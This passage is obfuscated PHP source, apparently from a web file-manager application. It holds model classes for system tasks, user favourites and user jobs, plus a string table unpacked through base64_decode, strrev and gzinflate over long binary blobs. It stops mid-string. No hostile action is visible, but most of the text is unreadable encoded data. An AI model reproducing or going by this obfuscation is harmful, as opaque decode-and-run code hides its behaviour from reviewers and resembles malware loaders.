$ê©·¥Ô•; $îÔ¤«’Ï->updateFileEnd($±é–Äï[$Ó›Ä”Õï[32]], $±é–Äï[$Ó›Ä”Õï[89]]); write_log($Ó›Ä”Õï[2328] . $²ôŸÊƒ‘, $Ó›Ä”Õï[1909]); continue; } $ÒÍ›çç = array($Ó›Ä”Õï[550] => $ê©·¥Ô•); $Ú—ßàÖé = array($Ó›Ä”Õï[907] => $‚Ş¢Óö›, $Ó›Ä”Õï[97] => $Ì‚ÉìåÕ); Model($Ó›Ä”Õï[240])->where($ÒÍ›çç)->save($Ú—ßàÖé); } $Æ„­îå‘ = $îÔ¤«’Ï->task; if (!$¡‚Ø§ş§) { Cache::set($ĞÜÊ‚•É, $Æ„­îå‘); } $îÔ¤«’Ï->end(); $ĞàüË¾Ê = array_unique($ĞàüË¾Ê); $­É­ëøı = array_unique($­É­ëøı); if (!$¡‚Ø§ş§ && ($ĞàüË¾Ê || $­É­ëøı)) { $¢Åùïéœ = array(); if ($ĞàüË¾Ê) { $¢Åùïéœ[] = sprintf(LNG($Ó›Ä”Õï[2329]), count($ĞàüË¾Ê)); } if ($­É­ëøı) { $¢Åùïéœ[] = sprintf(LNG($Ó›Ä”Õï[2330]), count($­É­ëøı)); } $¢Åùïéœ = sprintf(LNG($Ó›Ä”Õï[2331]), implode($Ó›Ä”Õï[2332], $¢Åùïéœ)) . $Ó›Ä”Õï[2333] . date($Ó›Ä”Õï[2334]) . $Ó›Ä”Õï[2335]; if ($×µÑŞË· == $Ó›Ä”Õï[1946]) { $¢Åùïéœ .= $Ó›Ä”Õï[2336] . LNG($Ó›Ä”Õï[2337]); } $Æ„­îå‘[$Ó›Ä”Õï[1275]] = $¢Åùïéœ; Cache::set($ĞÜÊ‚•É, $Æ„­îå‘); unset($Û™‘¦©ò[$Ó›Ä”Õï[6]]); $ºş‡Çİ = array($Ó›Ä”Õï[484] => $£²Å•Àş, $Ó›Ä”Õï[2216] => $Ó›Ä”Õï[629], $Ó›Ä”Õï[32] => $Û™‘¦©ò[$Ó›Ä”Õï[32]], $Ó›Ä”Õï[1298] => $Û™‘¦©ò); Hook::trigger($Ó›Ä”Õï[1790], array($Ó›Ä”Õï[1298] => $ºş‡Çİ, $Ó›Ä”Õï[1308] => !0)); show_json($¢Åùïéœ, !1, 100111); } if ($×µÑŞË· == $Ó›Ä”Õï[629]) { return !0; } if ($ĞàüË¾Ê || $­É­ëøı) { $ÓÖ¡§ˆù = array_merge($ĞàüË¾Ê, $­É­ëøı); $ÓÖ¡§ˆù = array_filter(array_unique($ÓÖ¡§ˆù)); $this->removeByFileID($ÓÖ¡§ˆù); } if ($Õ·Ä¼òÒ) { $Õ·Ä¼òÒ = array_filter(array_unique($Õ·Ä¼òÒ)); foreach ($Õ·Ä¼òÒ as $²ôŸÊƒ‘) { $ß²¡ºÄ = IO::has($²ôŸÊƒ‘, !0); if (!$ß²¡ºÄ[$Ó›Ä”Õï[249]] && !$ß²¡ºÄ[$Ó›Ä”Õï[250]]) { IO::remove($²ôŸÊƒ‘); } } } return $this->remove($£²Å•Àş); } private function removeByFileID($©À»¿ğç = array()) { $øÎì”¸« =& $_SERVER[÷ôÚîå]; if (empty($©À»¿ğç)) { return; } $öë¶áå° = array($øÎì”¸«[550] => array($øÎì”¸«[7], $©À»¿ğç)); $Ûæô‹æ€ = Model($øÎì”¸«[1429])->where($öë¶áå°)->field($øÎì”¸«[203])->select(); if (!$Ûæô‹æ€) { return Model($øÎì”¸«[553])->remove($©À»¿ğç); } $Ûæô‹æ€ = array_to_keyvalue($Ûæô‹æ€, $øÎì”¸«[12], $øÎì”¸«[203]); foreach ($Ûæô‹æ€ as $Ãù­ñ…™) { Model($øÎì”¸«[914])->removeNow($Ãù­ñ…™, !1); } } private function removeShareItems($óŒ°€‘ú) { $õ¶ˆ´Œ =& $_SERVER[÷ôÚîå]; $îÊƒµòƒ = "\173\x69\x6f\72{$óŒ°€‘ú}\x7d\x2f"; $Ú­©ñŸé = array($õ¶ˆ´Œ[203] => 0, $õ¶ˆ´Œ[1268] => array($õ¶ˆ´Œ[468], "{$îÊƒµòƒ}\45")); $ùŸ¨  = Model($õ¶ˆ´Œ[1957])->where($Ú­©ñŸé)->field($õ¶ˆ´Œ[674])->select(); if (empty($ùŸ¨ )) { return; } $ÒòÀß£‘ = array_to_keyvalue($ùŸ¨ , $õ¶ˆ´Œ[12], $õ¶ˆ´Œ[674]); Model($õ¶ˆ´Œ[673])->remove($ÒòÀß£‘); } } goto D“‚³¶ë¦; cËÀ¢ëÖéº: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\164\x61\163\x6b\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\164\171\160\x65", "\x65\x76\145\156\x74", "\x74\151\x6d\x65", "\x64\x65\x73\143", "\163\x79\x73\x74\145\x6d", "\x65\x6e\x61\x62\x6c\145", "\x6c\141\x73\x74\x52\165\156", "\x73\157\x72\x74"); public function listData($¨ºÖ”é¹ = false, $’øßè×² = "\x73\157\162\164", $µà­…Òé = false) { return parent::listData($¨ºÖ”é¹, $’øßè×², $µà­…Òé); } public function add($•ìÁùÄÏ) { $Ü“İŸ“… =& $_SERVER[÷ôÚîå]; $à¡±–õ‘ = $this->findByName($•ìÁùÄÏ[$Ü“İŸ“…[32]]); if ($à¡±–õ‘) { return !1; } $•ìÁùÄÏ[$Ü“İŸ“…[1730]] = 0; $•ìÁùÄÏ[$Ü“İŸ“…[2002]] = $this->getSort(); return parent::insert($•ìÁùÄÏ); } private function getSort() { $öĞ¥’ïÌ =& $_SERVER[÷ôÚîå]; $‰»ÔëÀ = parent::listData(); $Üá§±ÜĞ = array_to_keyvalue($‰»ÔëÀ, $öĞ¥’ïÌ[12], $öĞ¥’ïÌ[2002]); return empty($Üá§±ÜĞ) ? 0 : max($Üá§±ÜĞ) + 1; } public function update($ŠÃŸ§, $òºéâå¬) { $Ñ°„ô·Š =& $_SERVER[÷ôÚîå]; $Şù‹”Í® = $this->listData($ŠÃŸ§); $¯Ä‹†æ» = $this->findByName($òºéâå¬[$Ñ°„ô·Š[32]]); if (!$Şù‹”Í® || $¯Ä‹†æ» && $¯Ä‹†æ»[$Ñ°„ô·Š[484]] != $Şù‹”Í®[$Ñ°„ô·Š[484]]) { return !1; } return parent::update($ŠÃŸ§, $òºéâå¬); } public function remove($ğ§şßÅå, $°©Î¨¬ = false) { $”ÜØ°Ô =& $_SERVER[÷ôÚîå]; $ÏÛş‰‚Ô = $this->listData($ğ§şßÅå); if (!$ÏÛş‰‚Ô) { return; } if (!$°©Î¨¬ && $ÏÛş‰‚Ô[$”ÜØ°Ô[201]] == $”ÜØ°Ô[101]) { return !1; } return parent::remove($ğ§şßÅå); } public function enable($êÏ‹¼èÒ, $Ù€­Ú¨œ) { return $this->update($êÏ‹¼èÒ, array($_SERVER[÷ôÚîå][2441] => $Ù€­Ú¨œ)); } public function run($€‡…œÁ•) { return $this->update($€‡…œÁ•, array($_SERVER[÷ôÚîå][2453] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($Ô•Œ¡¨) { $ÑÍ¾‹– =& $_SERVER[÷ôÚîå]; return array($ÑÍ¾‹–[2093] => array(USER_ID, $ÑÍ¾‹–[2454])); } protected function listData() { $ÔÅªôø =& $_SERVER[÷ôÚîå]; $‘çã¬âÃ = array($ÔÅªôø[1770] => USER_ID, $ÔÅªôø[566] => 0); $˜çşîª¹ = $ÔÅªôø[2455]; $Û‰Ûä = $this->field($˜çşîª¹)->where($‘çã¬âÃ)->order($ÔÅªôø[2456])->select(); return $Û‰Ûä ? $Û‰Ûä : array(); } protected function resetCache() { } protected function listView() { $‡÷ıÎ§ =& $_SERVER[÷ôÚîå]; $—“Æ÷„ = $this->listData(); $µŠ¨®ú– = array_filter_by_field($—“Æ÷„, $‡÷ıÎ§[33], $‡÷ıÎ§[499]); $—àˆŸ„ = array_to_keyvalue($µŠ¨®ú–, $‡÷ıÎ§[12], $‡÷ıÎ§[97]); if (!$—àˆŸ„) { return $—“Æ÷„; } $Ë‡í¢‡ = 2000; $æƒÙå¹Ÿ = array($‡÷ıÎ§[500] => array($‡÷ıÎ§[501], $—àˆŸ„)); $Ö¬Ã‡ç½ = Model($‡÷ıÎ§[914])->listSource($æƒÙå¹Ÿ, $Ë‡í¢‡); $Ö¬Ã‡ç½ = array_merge($Ö¬Ã‡ç½[$‡÷ıÎ§[96]], $Ö¬Ã‡ç½[$‡÷ıÎ§[95]]); $Ö¬Ã‡ç½ = array_to_keyvalue($Ö¬Ã‡ç½, $‡÷ıÎ§[203]); foreach ($—“Æ÷„ as $ŸƒƒÜ´™ => $ãöçÛ×ä) { $šáÄ¾È¡ = $Ö¬Ã‡ç½[$ãöçÛ×ä[$‡÷ıÎ§[97]]]; $šáÄ¾È¡ = $šáÄ¾È¡ ? $šáÄ¾È¡ : array(); $—“Æ÷„[$ŸƒƒÜ´™] = array_merge($šáÄ¾È¡, $ãöçÛ×ä); } return $—“Æ÷„; } protected function addFav($“¯š¾Âı, $Ù ‚­ÌÎ = '', $êÂ¸½© = "\163\x6f\165\x72\x63\x65") { $ëÒ›é™Ü =& $_SERVER[÷ôÚîå]; $¼Ï„Î»Ş = array($ëÒ›é™Ü[1770] => USER_ID, $ëÒ›é™Ü[566] => 0, $ëÒ›é™Ü[505] => $êÂ¸½©, $ëÒ›é™Ü[504] => $“¯š¾Âı); if ($this->where($¼Ï„Î»Ş)->find()) { return !1; } $¼Ï„Î»Ş = array($ëÒ›é™Ü[1770] => USER_ID, $ëÒ›é™Ü[566] => 0); $Ò‘Ú³Üé = $this->where($¼Ï„Î»Ş)->max($ëÒ›é™Ü[2002]); if (!$Ò‘Ú³Üé) { $Ò‘Ú³Üé = 0; } if (!$Ù ‚­ÌÎ && $êÂ¸½© == $ëÒ›é™Ü[499]) { $ÒÂ²ì†€ = Model($ëÒ›é™Ü[1429])->where(array($ëÒ›é™Ü[500] => $“¯š¾Âı))->find(); if (!$ÒÂ²ì†€) { return !1; } $Ù ‚­ÌÎ = $ÒÂ²ì†€[$ëÒ›é™Ü[32]]; } $Ù ‚­ÌÎ = $this->getAutoName($Ù ‚­ÌÎ); $ç’¡´Ÿ = array($ëÒ›é™Ü[1770] => USER_ID, $ëÒ›é™Ü[566] => 0, $ëÒ›é™Ü[503] => $Ù ‚­ÌÎ, $ëÒ›é™Ü[504] => $“¯š¾Âı, $ëÒ›é™Ü[505] => $êÂ¸½©, $ëÒ›é™Ü[1982] => $Ò‘Ú³Üé + 1); return $this->add($ç’¡´Ÿ); } protected function remove($ÄêÒìç’) { $Şî‘¥¥Â =& $_SERVER[÷ôÚîå]; $ŞòªÈ˜ = array($Şî‘¥¥Â[1770] => USER_ID, $Şî‘¥¥Â[502] => $ÄêÒìç’); return $this->where($ŞòªÈ˜)->delete(); } protected function removeByName($‘¯òôÖË) { $¢š³™Š€ =& $_SERVER[÷ôÚîå]; $œ¡‘ØÛí = array($¢š³™Š€[1770] => USER_ID, $¢š³™Š€[503] => $‘¯òôÖË, $¢š³™Š€[566] => 0); return $this->where($œ¡‘ØÛí)->delete(); } protected function rename($·û›Ñ®, $Ÿ˜±ÑëÕ) { $á£¥÷äÆ =& $_SERVER[÷ôÚîå]; if ($·û›Ñ® == $Ÿ˜±ÑëÕ) { return !1; } $ğÖŞ€¬ = $this->getAutoName($Ÿ˜±ÑëÕ); if ($Ÿ˜±ÑëÕ != $ğÖŞ€¬) { return !1; } $Ç¾ùÜÇ¹ = array($á£¥÷äÆ[1770] => USER_ID, $á£¥÷äÆ[566] => 0, $á£¥÷äÆ[32] => $·û›Ñ®); return $this->where($Ç¾ùÜÇ¹)->save(array($á£¥÷äÆ[32] => $Ÿ˜±ÑëÕ)); } protected function resetSort($¤ïúáÕÄ) { $Õ«Ï°ö· =& $_SERVER[÷ôÚîå]; $¤ïúáÕÄ = is_array($¤ïúáÕÄ) ? $¤ïúáÕÄ : array(); $„ÙÍŸ®Ò = array($Õ«Ï°ö·[1770] => USER_ID); for ($óáÈÖÖ = 0; $óáÈÖÖ < count($¤ïúáÕÄ); $óáÈÖÖ++) { $„ÙÍŸ®Ò[$Õ«Ï°ö·[502]] = $¤ïúáÕÄ[$óáÈÖÖ]; $this->where($„ÙÍŸ®Ò)->save(array($Õ«Ï°ö·[1982] => $óáÈÖÖ + 1)); } return !0; } protected function moveTop($·¤·Ôå’) { $ø²ğ×¦ä =& $_SERVER[÷ôÚîå]; $òÕ»¼Ï‚ = array($ø²ğ×¦ä[1770] => USER_ID, $ø²ğ×¦ä[566] => 0); $æŞÙ‡Ò§ = $this->where($òÕ»¼Ï‚)->where(array($ø²ğ×¦ä[32] => $·¤·Ôå’))->find(); if (!$æŞÙ‡Ò§) { return; } $øË¶ÏËÏ = $this->field($ø²ğ×¦ä[484])->where($òÕ»¼Ï‚)->order($ø²ğ×¦ä[2456])->select(); $øË¶ÏËÏ = array_to_keyvalue($øË¶ÏËÏ, $ø²ğ×¦ä[12], $ø²ğ×¦ä[484]); $Æ®€Öİ = $øË¶ÏËÏ; $øË¶ÏËÏ = array_remove_value($øË¶ÏËÏ, $æŞÙ‡Ò§[$ø²ğ×¦ä[484]]); array_unshift($øË¶ÏËÏ, $æŞÙ‡Ò§[$ø²ğ×¦ä[484]]); return $this->resetSort($øË¶ÏËÏ); } protected function moveBottom($Èª·”‘) { $©ÔÜ“˜ =& $_SERVER[÷ôÚîå]; $Êƒ™‘ÕÉ = array($©ÔÜ“˜[1770] => USER_ID, $©ÔÜ“˜[566] => 0); $å¯×¼ = $this->where($Êƒ™‘ÕÉ)->max($©ÔÜ“˜[2002]); $êŞæŸ´ = array($©ÔÜ“˜[2002] => $å¯×¼ + 1); return $this->where($Êƒ™‘ÕÉ)->where(array($©ÔÜ“˜[32] => $Èª·”‘))->save($êŞæŸ´); } private function getAutoName($¬èâÂı) { $†â‘üõÖ =& $_SERVER[÷ôÚîå]; $çÈÏÄÕÏ = array($†â‘üõÖ[1770] => USER_ID, $†â‘üõÖ[566] => 0); $¯•Ì£†› = $this->field($†â‘üõÖ[32])->where($çÈÏÄÕÏ)->select(); $¯•Ì£†› = array_to_keyvalue($¯•Ì£†›, $†â‘üõÖ[12], $†â‘üõÖ[32]); if (!$¯•Ì£†› || !in_array($¬èâÂı, $¯•Ì£†›)) { return $¬èâÂı; } for ($á¦•–Íã = 0; $á¦•–Íã < count($¯•Ì£†›); $á¦•–Íã++) { if (!in_array($¬èâÂı . "\x28{$á¦•–Íã}\51", $¯•Ì£†›)) { return $¬èâÂı . "\x28{$á¦•–Íã}\x29"; } } return $¬èâÂı . "\x28{$á¦•–Íã}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x6a\157\x62\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\144\145\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\145\x6c\146\112\157\142\x4c\x69\x73\164"; public function listData($‰ˆ¡ë‘½ = false, $•†¤æšÒ = "\163\157\x72\164", $âÏÉ¯© = false) { return parent::listData($‰ˆ¡ë‘½, $•†¤æšÒ, $âÏÉ¯©); } public function remove($®˜Ï…Š«) { return parent::remove($®˜Ï…Š«); } public function add($õ–åÈ›¬) { $’¦ı¤¤‡ =& $_SERVER[÷ôÚîå]; if ($this->findByName($õ–åÈ›¬[$’¦ı¤¤‡[32]])) { return !1; } $õ–åÈ›¬[$’¦ı¤¤‡[2002]] = $this->getSort(); return parent::insert($õ–åÈ›¬); } private function getSort() { $Õ¼‚¸Š¤ =& $_SERVER[÷ôÚîå]; $¹ùÒš— = parent::listData(); $Š”ÑºÔÃ = array_to_keyvalue($¹ùÒš—, $Õ¼‚¸Š¤[12], $Õ¼‚¸Š¤[2002]); return empty($Š”ÑºÔÃ) ? 0 : max($Š”ÑºÔÃ) + 1; } public function update($Û·‰ù¹, $§ÍÌóÃ) { $êˆ®Á¢ù =& $_SERVER[÷ôÚîå]; $ÖœñÈÁ° = parent::listData($Û·‰ù¹); $³ÛÂÌ¬† = $this->findByName($§ÍÌóÃ[$êˆ®Á¢ù[32]]); if (!$ÖœñÈÁ° || $³ÛÂÌ¬† && $³ÛÂÌ¬†[$êˆ®Á¢ù[484]] != $ÖœñÈÁ°[$êˆ®Á¢ù[484]]) { return !1; } return parent::update($Û·‰ù¹, $§ÍÌóÃ); } public function setUserJob($ÂàŒ§•, $îËøçÚ) { $Ö¤ùĞïß =& $_SERVER[÷ôÚîå]; if (!is_array($îËøçÚ)) { $îËøçÚ = array($îËøçÚ); } $¥ş¬âØœ = parent::listData(); $¢Šã‹ = array_to_keyvalue($¥ş¬âØœ, $Ö¤ùĞïß[32]); $Ş²ôÁËÂ = $Ö¤ùĞïß[463]; foreach ($îËøçÚ as $ƒ›Ğ¾òÍ) { if ($¢Šã‹[$ƒ›Ğ¾òÍ]) { $Ş²ôÁËÂ .= $¢Šã‹[$ƒ›Ğ¾òÍ][$Ö¤ùĞïß[484]] . $Ö¤ùĞïß[50]; } else { $¥œ™»İ· = $this->add($ƒ›Ğ¾òÍ); $Ş²ôÁËÂ .= $¥œ™»İ· . $Ö¤ùĞïß[50]; } } $Ş²ôÁËÂ = rtrim($Ş²ôÁËÂ, $Ö¤ùĞïß[50]); Model($Ö¤ùĞïß[607])->metaSet($ÂàŒ§•, self::JOB_KEY, $Ş²ôÁËÂ); } public function getUserJob($€¯ü«Åë) { $ñ©¾ç = Model($_SERVER[÷ôÚîå][607])->metaGet($€¯ü«Åë); return $this->getUserJobInfo($ñ©¾ç[self::JOB_KEY]); } public function getUserJobInfo($Å€í¾‚) { $›œº”ç =& $_SERVER[÷ôÚîå]; $“ºÛÖÙø = explode($›œº”ç[50], $Å€í¾‚); $ÔÁ÷¹èË = parent::listData(); $ÔÁ÷¹èË = array_remove_key($ÔÁ÷¹èË, $›œº”ç[241]); $¡•ğ’š = array(); foreach ($“ºÛÖÙø as $¼÷Ö¶ÚÓ) { if (isset($ÔÁ÷¹èË[$¼÷Ö¶ÚÓ])) { $¡•ğ’š[] = $ÔÁ÷¹èË[$¼÷Ö¶ÚÓ]; } } return $¡•ğ’š; } } goto B¤‘ÍÃíĞç; cšâ´í±: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\217\367\364\332\356\345", "\xdb\xda\xb8\xf9\xa1\xb6"); $_SERVER[÷ôÚîå] = explode("\174\2\174\1\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\150\51\224\255\120\372\227\355\57\205\62\61\44\266\23\55\266\263\73\161\22\131\222\155\45\262\145\44\71\13\266\231\214\245\261"."\x35\xb1\xa4\x51\x34\x23\x6f\x49\x28\x9\x5b\x9\x84\x50\xf6\xb5\x40\xa1\x94\xd2\x26\x61\x6f\x48\xa0\xa5\xb4\xd0\xfe\xd0\x96\x52\xda\x12\xe8\x3\xa\x8d\x9d\x50\x28\x7b\x1f\x3b\xbc\xbb\x9c\xbb\xcc\x48\x86\xff"."\x7d\xff\xfb\xbe\x97\x2f\x89\xee\x3e\x77\x39\xf7\x9c\x73\xcf\x3d\xf7\x9c\x4b\xdf\xfe\xdd\x59\xbb\x6e\x5b\xff\xe5\xf5\x7\xac\xff\xf2\xde\x9b\xf6\x7c\xf8\xd2\x87\x34\xbc\xfe\xa0\xf5\x7\xae\xff\xa\xd\x9f\x7c".base64_decode('4aFfIn+OvnBzTU3bnMNndByx9d5t2o+17dqWWPSJ30WO/MNPl4YnbnlidOKALy3ZvDjViA==').base64_decode('CtO6jfRHyZu2oo8Ylm3RhJSZ7zcGaNjI018//emKR4t6zrR1GvXRHxX6Rf631mYNlq92xA==').base64_decode('kmqiq7MzHE9CoUY5P2emIVTQiloOvl/QixbqjdycWjALet6RIhLSmq31aRa0FGpWQ+HOaA==').base64_decode('bJWaXNUZhhJ96tqSXhylMRJM2FrRTho5nZcYLvJ+NYdbIx1KMh7oSASCyUisgyYHY+3tkQ==')."\144\171\172\74\26\215\66\7\202\313\312\163\72\343\201\326\366\200\202\372\227\325\125\43\337\157\326\50\253\151\316\152\245\226\6\132\14\75\233\246\301\274\306\272\143\217\26\40\224\344\41\264"."\x4c\xf9\x52\x36\x4b\x23\x1d\x3c\x94\xd6\xfb\xb5\x52\x16\x66\x2b\x24\x47\xa\x45\x23\xa7\xb1\x41\x2f\xd3\x47\x79\x2a\xd\x68\x25\xdb\x34\xf2\x29\x1a\x9\x8f\xd8\x45\x4d\xa4\xa3\xbe\xa6\xd0\x42\xeb\x79\x68\x2a"."\21\216\206\203\111\5\167\120\151\211\307\332\25\130\204\234\146\331\172\121\131\321\26\216\207\25\334\351\246\152\62\326\152\5\340\245\3\115\205\22\210\106\225\311\132\260\365\134\201\65\103\353"."\124\150\54\26\17\205\343\112\363\52\105\314\120\312\314\345\314\274\17\265\202\126\322\226\272\32\216\307\151\300\3\340\35\215\340\105\203\110\254\245\45\21\346\61\30\334\151\121\324\223\231\0"."\237\216\130\272\77\153\253\103\132\266\304\300\164\220\376\126\303\17\374\252\132\277\221\325\23\306\230\36\311\273\123\150\34\307\324\1\335\126\321\346\262\121\137\1\324\233\3\211\110\120\355\14".strrev('?#Yò• ­¢ÌúÕPjz2&`³?§¶>¾â~ò3ïçÑ¨ô†1•1Zü´•¿î`Û$').strrev('ßÑ›ˆv'."\r".'a­JÇÖ}z„ßT9z)gZV%ÛäÓT0NØ%ÈÖ»¾M†„÷(').base64_decode('UL8PT8SQXrRVPZ8y00Ye8M1i2DeanQkV0QQUYfrMbJqFLcekdpRychEeRdOXTRcZivi8kg==')."\x34\x1a\xe5\x18\x7\x97\x15\xb1\x2\xea\x9\x47\x56\x46\xff\xa8\x40\x19\xb8\x5c\x27\xcf\xb5\xcc\x52\x31\x85\x96\xbf\x1f\xa6\xa5\x1e\x92\x75\xdb\x46\x83\x63\x13\x62\x76\x15\xb2\xa6\x96\x4e\xe8\x45\x3e\x34\xc3".strrev('«6z2Ÿ@÷{jÿ —»{OŞîšşc4´ímc!UÑ¶6¾V„.bÌZÅ"Xœ¶JÅ'."\r".'Al').base64_decode('6iM67P1cerbFJsNvYXBDKTQaiakZzcq0p2erpBYjCml9xFfIFAAxcVzU49ibeOo6TDsskQ==')."\226\254\231\322\262\362\20\151\70\143\333\205\204\236\117\267\160\110\115\233\303\171\62\123\5\235\1\165\310\243\244\225\166\145\225\322\326\150\64\132\254\142\56\313\103\154\164\74\315\342\211\366".strrev('l½fh¹ÛDË-Ò• bĞk¨»-{n¶S7ï3'."\r".'³JF³´`ZH"ÃAğULÛ+@?tÎ[')."\xd6\x1c\xf6\xc6\x8a\xc6\x80\x91\x6f\x54\xa6\x3\xbd\xa0\x7b\xdd\x8b\x71\x78\x23\x20\x9b\xaa\x5\xa\x6\x1c\xfc\x99\xe9\x4d\x25\xbb\xdf\x3b\x8f\x21\x11\x5e\xba\xa8\xe5\xad\x7e\xbd\xe8\xd\xc3\xce\x68\x54\x50"."\147\71\42\147\305\102\206\125\60\55\3\167\257\121\321\154\133\113\145\60\22\24\315\67\175\116\171\3\43\10\275\274\54\152\104\367\166\26\265\201\234\326\250\24\112\175\150\2\140\103\102\132".strrev('©£Ë'."\n".'+³u™± eD	½§¡’7Ûßª {kJÔl[¨£#Â–°'."\r".'«Äm9*4Ã—'."\n".'')."\x6d\xc9\x64\xa7\x1a\x69\x41\x6c\x44\x47\x58\x6d\xf\x24\x83\x80\x26\xc3\xb6\x36\xc0\x9a\x8e\x22\xda\xc1\x9b\x64\x89\x2b\xbd\x68\x43\x61\x68\xea\x40\x83\x13\x89\x9d\xe6\xb0\x5e\x44\x1f\x6e\x1e\x6d\x54\x6\xcd"."\164\237\71\342\143\131\55\200\256\131\141\274\276\5\333\33\327\362\3\170\30\175\243\266\156\271\161\123\63\142\72\174\375\164\367\372\372\364\176\263\10\243\261\206\6\234\223\37\325\363\3\166"."\x86\xb5\x9d\x8\xc7\x97\x87\xe3\x6a\x22\xd6\x92\x5c\x11\x88\x3\x8f\x92\x47\x90\x33\xc2\x7a\x83\xbf\x9e\xf5\xc6\xf5\x34\x9a\xc4\x94\xcd\xea\x69\x5\x31\xfb\x2b\xbd\x78\xc3\xe0\x8f\xb3\x5c\xbc\x89\x58\x5e\x34"."\322\212\347\56\344\265\120\41\257\134\212\265\35\65\162\6\36\236\315\163\310\144\43\6\246\25\72\344\47\143\156\352\261\246\327\364\244\147\324\172\321\377\323\153\273\173\102\276\351\275\213\375"."\x86\xa8\xe3\xaf\xf7\xd5\x2b\xd\x75\x73\x94\x4e\xc4\x51\x19\x5a\x56\x81\x41\x97\x95\xa8\x53\x62\xcb\x9c\xd3\x22\x20\x3c\x6f\xe6\xf5\x8a\x1b\xb\x1\x92\x69\xe9\xde\x36\x5d\x43\x48\x1a\x2d\x84\x63\x5d\x3c\xec".base64_decode('WzT+ObOLabqES1zrQhPj4dO6womk2h5OtsVC0P1wAEJ5VJn0l60xZiCBLOahWX1EoiGCFg==').base64_decode('pOQJIfU6zGGG/V0AFMTUfJI8FILRmBQvsaXrpj+9AM29QPkNq0WimzjK8atq9q1BkNWuMw==')."\x22\x2\x5f\x8a\xe4\xd0\x1e\x16\x3d\x57\x9d\x44\x8e\xd\xab\x5d\x40\x3a\xda\x32\x2b\x8c\x34\xa7\x82\x28\xda\xa6\x1b\x3\x19\xe8\xa8\x81\x9b\x4b\x99\x59\xb3\xa8\x65\x31\xee\x67\xc\xf6\x80\x1\x68\xb8\x90\x2d".base64_decode('Ibj344aTmVKuDygVmiPELAne1xpFDGKOUWRE1u1IyEF3IeZXMaz2+Ar5gdpToS21YXYdTg==')."\200\145\204\221\241\103\100\111\57\37\272\57\145\242\215\335\256\15\352\215\170\54\200\315\26\220\124\26\221\20\346\2\114\343\232\334\170\1\57\117\326\227\103\215\220\66\203\46\247\312\364\230"."\265\300\111\343\24\275\130\64\213\123\240\4\11\53\204\120\342\345\202\306\155\316\166\130\10\5\260\160\306\344\154\212\311\200\261\321\17\343\236\332\320\2\150\43\215\330\65\237\145\243\105\100".base64_decode('A9TS6UrJCNVAA+sZnJIMxgf4EzPRX0H002ZOYySUED89TamfI4luW5o0nbVbtE2cWXSURA==')."\x90\x98\x31\xa1\x67\x68\xe9\x61\x54\x25\x3e\x3c\x36\xd0\xb4\x9e\xd5\x19\x14\x65\x74\xc6\x40\xd4\x41\x31\x34\xfd\x1c\xc6\x4\xdb\x8b\x8e\x32\x28\x55\x70\x6e\x86\x15\x47\x35\x31\xb9\x67\xf1\x15\xf8\xec\x27\x12"."\60\317\3\300\43\202\131\264\164\61\262\153\104\274\263\250\367\33\43\14\101\214\330\355\132\161\220\15\14\325\24\373\15\107\244\275\330\322\25\215\252\301\130\107\22\35\35\151\312\212\170\44"."\31\146\170\50\20\122\3\301\116\210\11\314\306\331\62\231\261\240\51\103\15\0\47\250\23\176\301\1\41\22\134\60\363\10\177\2\12\362\212\203\145\131\126\132\60\10\0\40\202\251\160\361".base64_decode('CYjS58a8OYQ8vLxPTvZMAXJPubwILFOaLw6ePLSRGV/YGUtAhcU4FfHmfXy/dXZBVk4CkQ==')."\326\60\44\132\31\255\36\0\151\105\202\321\356\22\52\130\64\306\64\61\226\305\254\43\154\4\271\254\340\361\235\303\361\212\45\57\131\136\35\263\27\342\13\263\274\155\355\201\240\67\321\26"."\150\230\75\207\246\256\312\245\173\222\155\206\325\163\72\217\303\374\15\133\263\324\242\216\60\15\373\120\103\135\75\303\3\210\75\222\272\267\312\233\363\342\126\360\324\371\352\352\352\130\133\63"."\346\50\31\204\340\70\31\111\223\345\141\7\256\122\152\220\355\24\55\305\170\136\114\136\54\357\260\301\120\362\251\374\170\160\152\71\330\234\352\44\204\320\104\211\220\140\125\113\341\217\251\250"."\x45\xbb\x64\xc9\x33\x85\xf6\x53\x1a\x55\x32\x18\x2b\x4f\x53\xb5\xec\x0\x9a\x74\x3b\x93\x93\x13\xc5\x8a\xd3\xb8\x4e\xf9\x42\xbe\x76\x7c\x16\xf1\xdc\x3a\x81\x5b\xee\x52\xc1\x44\x9c\x28\xc\x63\x65\xc5\x3e\xac"."\xac\xd4\x87\x95\xae\x3e\xac\x2c\xef\x3\x4d\xb2\x8c\x81\x3c\x1a\x25\xa3\x6a\xb0\x1c\xad\x78\x39\xa4\x65\x75\x2c\xf3\x88\x8a\x2a\xb2\xe3\xbc\x2a\xf\x5\x26\x9\x86\x21\xe7\xb4\x71\x34\xc6\x6\xd9\x1e\x9a\xcd"."\372\21\150\77\335\33\12\60\44\260\160\61\2\121\145\10\213\302\314\174\123\165\275\257\256\132\141\107\345\246\352\256\144\13\72\70\54\136\164\370\302\240\231\53\140\214\330\216\117\207\170\357"."\xd0\x13\xe2\x22\x90\x11\x2c\xc4\x4c\x19\x8b\x74\xf2\xad\x45\xe3\xe1\xa4\x6\x54\x71\xa1\x5f\x2e\xb7\xd0\x3f\x59\xab\x0\x6c\x39\x6d\xcc\xcc\x23\xf0\x46\xd4\x32\xe7\x4b\x1\xc\x63\xfe\x93\x13\x1f\x1c\xb1\x78".strrev('Êì+­(YŠ‰’$Œ¯q ym!v¤á1oN^S«½<²Z